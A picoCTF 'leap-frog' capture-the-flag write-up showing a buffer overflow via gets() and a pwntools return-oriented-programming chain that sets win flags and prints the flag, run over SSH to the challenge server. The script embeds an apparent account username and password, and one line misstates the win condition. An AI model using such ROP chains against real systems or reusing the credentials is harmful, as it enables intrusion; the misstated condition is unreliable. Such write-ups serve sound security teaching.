# Problem
Can you jump your way to win in the following [program](https://2019shell1.picoctf.com/static/ac16ea5c2f0caccccb99712dc3bd737e/rop) and get the flag? You can find the program in /problems/leap-frog_5_d75e27ca262f95ef1168d21a5cee638d on the shell server? [Source](https://2019shell1.picoctf.com/static/ac16ea5c2f0caccccb99712dc3bd737e/rop).


## Hints:

Try and call the functions in the correct order!

Remember, you can always call main() again!

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/ac16ea5c2f0caccccb99712dc3bd737e/rop
wget https://2019shell1.picoctf.com/static/ac16ea5c2f0caccccb99712dc3bd737e/rop.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>


#define FLAG_SIZE 64

bool win1 = false;
bool win2 = false;
bool win3 = false;

void leapA() {
  win1 = true;
}

void leap2(unsigned int arg_check) {
  if (win3 && arg_check == 0xDEADBEEF) {
    win2 = true;
  }
  else if (win3) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void leap3() {
  if (win1 && !win1) {
    win3 = true;
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void display_flag() {
  char flag[FLAG_SIZE];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  
  if (win1 && win2 && win3) {
    printf("%s", flag);
    return;
  }
  else if (win1 || win3) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```

The goal of this challenge is to teach us [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming).

The conditions required for getting the flag are ```win1 && win2 && arg_check2 == 0xDEADBAAD```.
```win1``` will be set when we call ```leapA()```, ```win3``` will maybe set through ```leap3()``` and then we just call ```leap2(0xDEADBEEF)``` and ```win2``` will be set as well.

The problem is that ```leap3``` has a problematic if condition. We need another way.

We can just use ```gets``` to set all three flags to `true`, and then we just call ```display_flag```.

First we need to calculate the offset of the return address in ```vuln()``` (we need to override it with our rop chain), we can use this gdbinit script.
```
run < <(echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000111122223333444455556666777788889999aaaabbbbccccddddeeee)
```

Lets debug:
```bash
gdb -x ./gdbinit ./rop

Stopped reason: SIGSEGV
0x48484848 in ?? ()
```

We know that ```HHHH``` overrides the return address.


We need to design a proper rop chain, we can use this script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

elf = ELF('./rop')
rop = ROP(elf)

win1_address          = elf.symbols['win1']
display_flag_address  = elf.symbols['display_flag']
gets_address          = elf.plt['gets']

rop.raw(gets_address)
rop.raw(display_flag_address)
rop.raw(win1_address)

log.info('Generated rop chain:\n{}'.format(rop.dump()))

if debug:
  p = process('./rop')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)

  s.set_working_directory('/problems/leap-frog_5_d75e27ca262f95ef1168d21a5cee638d')
  p = s.process('./rop')

print p.recvuntil('Enter your input> ')

p.sendline('AAAABBBBCCCCDDDDEEEEFFFFGGGG' + str(rop))
p.sendline('\x01\x01\x01')

print p.recvall()
```

Flag: picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_ce26a829}
